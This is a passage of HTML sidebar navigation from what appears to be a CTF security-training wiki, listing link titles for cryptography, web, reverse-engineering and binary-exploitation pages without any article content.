    <a href="../../../../crypto/asymmetric/rsa/rsa_module_attack-zh/" title="Modulo-related Attacks" class="md-nav__link">
      Modulo-related Attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_e_attack-zh/" title="Public Key Index Related Attacks" class="md-nav__link">
      Public Key Index Related Attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_d_attack-zh/" title="Private Key d Related Attacks" class="md-nav__link">
      Private Key d Related Attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_coppersmith_attack-zh/" title="Coppersmith Related Attacks" class="md-nav__link">
      Coppersmith Related Attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_chosen_plain_cipher-zh/" title="Chosen Plain Cipher Attack" class="md-nav__link">
      Chosen Plain Cipher Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_side_channel-zh/" title="Side Channel Attack" class="md-nav__link">
      Side Channel Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_pkcs_attack-zh/" title="Bleichenbacher Attack" class="md-nav__link">
      Bleichenbacher Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_complex-zh/" title="Challenge Examples" class="md-nav__link">
      Challenge Examples
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/knapsack/knapsack-zh/" title="Knapsack Cipher" class="md-nav__link">
      Knapsack Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-6-4" type="checkbox" id="nav-3-6-4">
    
    <label class="md-nav__link" for="nav-3-6-4">
      Discrete Log Correlation
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-6-4">
        Discrete Log Correlation
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/discrete-log/discrete-log-zh/" title="Discrete Logarithm" class="md-nav__link">
      Discrete Logarithm
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/discrete-log/elgamal-zh/" title="Elgamal" class="md-nav__link">
      Elgamal
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/discrete-log/ecc-zh" title="ECC" class="md-nav__link">
      ECC
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-6-5" type="checkbox" id="nav-3-6-5">
    
    <label class="md-nav__link" for="nav-3-6-5">
      Lattice-based Cryptography
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-6-5">
        Lattice-based Cryptography
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/lattice/overview-zh/" title="Lattice Overview" class="md-nav__link">
      Lattice Overview
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/lattice/introduction-zh/" title="Introduction to Lattices" class="md-nav__link">
      Introduction to Lattices
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/lattice/lattice-reduction-zh/" title="Lattice-based Algorithm" class="md-nav__link">
      Lattice-based Algorithm
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/lattice/cvp-zh/" title="CVP" class="md-nav__link">
      CVP
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-7" type="checkbox" id="nav-3-7">
    
    <label class="md-nav__link" for="nav-3-7">
      Hash Function
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-7">
        Hash Function
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/introduction-zh/" title="Introduction to the Hash Function" class="md-nav__link">
      Introduction to the Hash Function
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/md5-zh/" title="MD5" class="md-nav__link">
      MD5
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/sha1-zh/" title="SHA1" class="md-nav__link">
      SHA1
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/fnv-zh/" title="FNV" class="md-nav__link">
      FNV
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/attack-zh/" title="Hash Attack" class="md-nav__link">
      Hash Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/complex-zh/" title="Challenge Examples" class="md-nav__link">
      Challenge Examples
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-8" type="checkbox" id="nav-3-8">
    
    <label class="md-nav__link" for="nav-3-8">
      Digital Signature
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-8">
        Digital Signature
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/introduction-zh/" title="Introduction to Digital Signatures" class="md-nav__link">
      Introduction to Digital Signatures
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/rsa-zh/" title="RSA Digital Signature" class="md-nav__link">
      RSA Digital Signature
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/elgamal-zh/" title="ElGamal Digital Signature" class="md-nav__link">
      ElGamal Digital Signature
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/dsa-zh/" title="DSA Digital Signature" class="md-nav__link">
      DSA Digital Signature
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-9" type="checkbox" id="nav-3-9">
    
    <label class="md-nav__link" for="nav-3-9">
      Summary of Attack Techniques
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-9">
        Summary of Attack Techniques
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/attack-summary/attack-mode-zh/" title="Introduction" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/attack-summary/meet-in-the-middle-zh/" title="Intermediate Encounter Attack" class="md-nav__link">
      Intermediate Encounter Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/attack-summary/bit-attack-zh/" title="Bit attack" class="md-nav__link">
      Bit attack
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/certificate/introduction-zh/" title="Certificate Format" class="md-nav__link">
      Certificate Format
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
    
    <label class="md-nav__link" for="nav-4">
      Web
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-4">
        Web
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/introduction-zh/" title="Introduction to Web Applications" class="md-nav__link">
      Introduction to Web Applications
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/sqli-zh/" title="SQL Injection" class="md-nav__link">
      SQL Injection
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/xss-zh/" title="XSS Cross-site Scripting Attack" class="md-nav__link">
      XSS Cross-site Scripting Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/csrf-zh/" title="CSRF Cross-site Request Forgery" class="md-nav__link">
      CSRF Cross-site Request Forgery
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/ssrf-zh/" title="SSRF Server Request Forgery" class="md-nav__link">
      SSRF Server Request Forgery
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/php/php-zh/" title="PHP Code Auditing" class="md-nav__link">
      PHP Code Auditing
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
    
    <label class="md-nav__link" for="nav-5">
      Assembly
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-5">
        Assembly
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../assembly/x86-x64/readme-zh/" title="x86_x64" class="md-nav__link">
      x86_x64
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../assembly/mips/readme-zh/" title="mips" class="md-nav__link">
      mips
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../assembly/arm/readme-zh/" title="arm" class="md-nav__link">
      arm
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
    
    <label class="md-nav__link" for="nav-6">
      Executable
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-6">
        Executable
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-1" type="checkbox" id="nav-6-1">
    
    <label class="md-nav__link" for="nav-6-1">
      ELF file
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-6-1">
        ELF file
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/elf-structure-zh/" title="ELF File Basic Structure" class="md-nav__link">
      ELF File Basic Structure
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/program-loading-zh/" title="Program Loading" class="md-nav__link">
      Program Loading
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/program-linking-zh/" title="Program Link" class="md-nav__link">
      Program Link
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/running-overview-zh/" title="Program Execution Flow" class="md-nav__link">
      Program Execution Flow
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
    
    <label class="md-nav__link" for="nav-7">
      Reverse Engineering
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-7">
        Reverse Engineering
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-1" type="checkbox" id="nav-7-1">
    
    <label class="md-nav__link" for="nav-7-1">
      Reverse Overview
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-7-1">
        Reverse Overview
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/introduction-zh/" title="Software Reverse Engineering Introduction" class="md-nav__link">
      Software Reverse Engineering Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/Identify-Encode-Encryption/introduction-zh/" title="Common Encryption Algorithms and Code Recognition" class="md-nav__link">
      Common Encryption Algorithms and Code Recognition
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/maze/maze-zh/" title="Labyrinth Problem" class="md-nav__link">
      Labyrinth Problem
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/vm/vm-zh/" title="Virtual Machine Command Analysis" class="md-nav__link">
      Virtual Machine Command Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/unicorn/introduction-zh/" title="Unicorn Engine Introduction" class="md-nav__link">
      Unicorn Engine Introduction
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-2" type="checkbox" id="nav-7-2">
    
    <label class="md-nav__link" for="nav-7-2">
      Linux Reverse
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-7-2">
        Linux Reverse
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-2-1" type="checkbox" id="nav-7-2-1">
    
    <label class="md-nav__link" for="nav-7-2-1">
      Linux Reverse Technology
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-7-2-1">
        Linux Reverse Technology
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/ld_preload-zh/" title="LD_PRELOAD" class="md-nav__link">
      LD_PRELOAD
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/false-disasm-zh/" title="Incorrect Disassembly Fix" class="md-nav__link">
      Incorrect Disassembly Fix
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/detect-bp-zh/" title="Detecting Breakpoints Bypassing" class="md-nav__link">
      Detecting Breakpoints Bypassing
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/detect-dbg-zh/" title="Detecting Debugging Bypassing" class="md-nav__link">
      Detecting Debugging Bypassing
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-3" type="checkbox" id="nav-7-3">
    
    <label class="md-nav__link" for="nav-7-3">
      Windows Reverse
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-7-3">
        Windows Reverse
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-3-1" type="checkbox" id="nav-7-3-1">
    
    <label class="md-nav__link" for="nav-7-3-1">
      Shelling Technology
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-7-3-1">
        Shelling Technology
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/packer-introduction-zh/" title="Introduction to the Protective case" class="md-nav__link">
      Introduction to the Protective case
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/trace-zh/" title="Single Step Tracking Method" class="md-nav__link">
      Single Step Tracking Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/esp-zh/" title="ESP Law" class="md-nav__link">
      ESP Law
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/direct-oep-zh/" title="One Step to the OEP Method" class="md-nav__link">
      One Step to the OEP Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/memory-zh/" title="Memory Mirroring Method" class="md-nav__link">
      Memory Mirroring Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/last-exception-zh/" title="Last Exception Method" class="md-nav__link">
      Last Exception Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/sfx-zh/" title="SFX Method" class="md-nav__link">
      SFX Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/fix-iat-zh/" title="DUMP and IAT Reconstruction" class="md-nav__link">
      DUMP and IAT Reconstruction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/manually-fix-iat-zh/" title="Manually Find the IAT and Rebuild It Using ImportREC" class="md-nav__link">
      Manually Find the IAT and Rebuild It Using ImportREC
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/unpack-dll-zh/" title="DLL File Unpacking" class="md-nav__link">
      DLL File Unpacking
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-3-2" type="checkbox" id="nav-7-3-2">
    
    <label class="md-nav__link" for="nav-7-3-2">
      Anti-debugging Technology
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-7-3-2">
        Anti-debugging Technology
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/ntglobalflag-zh/" title="NtGlobalFlag" class="md-nav__link">
      NtGlobalFlag
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/heap-flags-zh/" title="Heap Flags" class="md-nav__link">
      Heap Flags
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/the-heap-zh/" title="The Heap" class="md-nav__link">
      The Heap
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/int-3-zh/" title="Interrupt 3" class="md-nav__link">
      Interrupt 3
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/isdebuggerpresent-zh/" title="IsDebuggerPresent" class="md-nav__link">
      IsDebuggerPresent
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/checkremotedebuggerpresent-zh/" title="CheckRemoteDebuggerPresent" class="md-nav__link">
      CheckRemoteDebuggerPresent
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/ntqueryinformationprocess-zh/" title="NtQueryInformationProcess" class="md-nav__link">
      NtQueryInformationProcess
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/junk-code-zh/" title="Flower command" class="md-nav__link">
      Flower command
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/example-zh/" title="Anti-debug technical example" class="md-nav__link">
      Anti-debug technical example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8" type="checkbox" id="nav-8">
    
    <label class="md-nav__link" for="nav-8">
      Pwn
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-8">
        Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-1" type="checkbox" id="nav-8-1">
    
    <label class="md-nav__link" for="nav-8-1">
      Pwn Overview
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-8-1">
        Pwn Overview
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../readme-zh/" title="Readme zh" class="md-nav__link">
      Readme zh
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2" type="checkbox" id="nav-8-2">
    
    <label class="md-nav__link" for="nav-8-2">
      Linux Pwn
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-8-2">
        Linux Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-1" type="checkbox" id="nav-8-2-1">
    
    <label class="md-nav__link" for="nav-8-2-1">
      Security Protection Mechanism
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-1">
        Security Protection Mechanism
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../mitigation/canary-zh/" title="Canary" class="md-nav__link">
      Canary
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-2" type="checkbox" id="nav-8-2-2">
    
    <label class="md-nav__link" for="nav-8-2-2">
      Stack Overflow
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-2">
        Stack Overflow
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/stack-intro-zh/" title="Stack Introduction" class="md-nav__link">
      Stack Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/stackoverflow-basic-zh/" title="Stack Overflow Principle" class="md-nav__link">
      Stack Overflow Principle
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/basic-rop-zh/" title="Basic ROP" class="md-nav__link">
      Basic ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/medium-rop-zh/" title="Intermediate ROP" class="md-nav__link">
      Intermediate ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/advanced-rop-zh/" title="Advanced ROP" class="md-nav__link">
      Advanced ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/fancy-rop-zh/" title="ROP Tricks" class="md-nav__link">
      ROP Tricks
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-3" type="checkbox" id="nav-8-2-3">
    
    <label class="md-nav__link" for="nav-8-2-3">
      Format String Vulnerability
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-3">
        Format String Vulnerability
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_intro-zh/" title="Format String Vulnerability Principle" class="md-nav__link">
      Format String Vulnerability Principle
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_exploit-zh/" title="Format String Exploit" class="md-nav__link">
      Format String Exploit
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_example-zh/" title="Format String Vulnerability Example" class="md-nav__link">
      Format String Vulnerability Example
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_detect-zh/" title="Format String Vulnerability Detection" class="md-nav__link">
      Format String Vulnerability Detection
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-4" type="checkbox" id="nav-8-2-4">
    
    <label class="md-nav__link" for="nav-8-2-4">
      Glibc Heap Related
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-4">
        Glibc Heap Related
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../introduction-zh/" title="Introduction to Heap" class="md-nav__link">
      Introduction to Heap
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../heap_overview-zh/" title="Heap Overview" class="md-nav__link">
      Heap Overview
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../heap_structure-zh/" title="Heap Related Data Structure" class="md-nav__link">
      Heap Related Data Structure
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-4-4" type="checkbox" id="nav-8-2-4-4">
    
    <label class="md-nav__link" for="nav-8-2-4-4">
      In-depth Understanding of Ptmalloc2
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-8-2-4-4">
        In-depth Understanding of Ptmalloc2
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/overview-zh/" title="Implementation" class="md-nav__link">
      Implementation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/basic-zh/" title="Basic Functions in the heap implementation" class="md-nav__link">
      Basic Functions in the heap implementation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/heap-init-zh/" title="Heap Initialization" class="md-nav__link">
      Heap Initialization
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/malloc-zh/" title="Allocate Heap Memory" class="md-nav__link">
      Allocate Heap Memory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/free-zh/" title="Free Heap Memory" class="md-nav__link">
      Free Heap Memory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/tcache-zh/" title="Tcache" class="md-nav__link">
      Tcache
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/malloc_state-zh/" title="malloc_state" class="md-nav__link">
      malloc_state
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/misc-zh/" title="Other" class="md-nav__link">
      Other
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../heapoverflow_basic-zh/" title="Heap Overflow" class="md-nav__link">
      Heap Overflow
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../off_by_one-zh/" title="Heap-based Off-By-One" class="md-nav__link">
      Heap-based Off-By-One
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../chunk_extend_overlapping-zh/" title="Chunk Extend/Overlapping" class="md-nav__link">
      Chunk Extend/Overlapping
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../unlink-zh/" title="Unlink" class="md-nav__link">
      Unlink
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../use_after_free-zh/" title="Use After Free" class="md-nav__link">
      Use After Free
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../fastbin_attack-zh/" title="Fastbin Attack" class="md-nav__link">
      Fastbin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../unsorted_bin_attack-zh/" title="Unsorted Bin Attack" class="md-nav__link">
      Unsorted Bin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../large_bin_attack-zh/" title="Large Bin Attack" class="md-nav__link">
      Large Bin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../tcache_attack-zh/" title="Tcache Attack" class="md-nav__link">
      Tcache Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_einherjar-zh/" title="House of Einherjar" class="md-nav__link">
      House of Einherjar
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_force-zh/" title="House of Force" class="md-nav__link">
      House of Force
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
